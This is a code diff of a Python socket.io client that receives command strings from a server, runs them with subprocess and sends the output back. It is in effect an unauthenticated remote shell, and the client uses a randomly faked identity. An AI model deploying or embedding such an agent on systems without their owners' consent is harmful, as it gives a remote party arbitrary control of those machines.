@@ -1,7 +1,11 @@
-import os
+
+import re
+import subprocess
+from shutil import which
 
 import socketio
 from faker import Faker
+
 
 fake = Faker()
 
@@ -13,6 +17,26 @@ payload = {
     'client_ID': fake.name(),
     'password': 'Does it matter ?',
 }
+
+
+def execute_command(command):
+    try:
+        command = re.sub(' +', ' ', command)
+        if ' ' in command:
+            command = command.split(' ')
+
+        # Checking if single command or with parameters.
+        test_command = command if isinstance(command, str) else command[0]
+
+        # Checking if program exists.
+        if which(test_command) is None:
+            return 'Program Not Found !'
+
+        output = subprocess.check_output(command)
+        print(output)
+        return output.decode('utf-8')
+    except subprocess.CalledProcessError:
+        return 'Can\'t be executed !'
 
 
 # Defining Event Handlers
@@ -46,7 +70,7 @@ def receive_command(json):
 @clientsio.on('server_commands', namespace='/command')
 def handle_command_from_server(command):
 
-    output = os.popen(command).read()
+    output = execute_command(command)
     clientsio.emit('output_from_client', output)
 
 
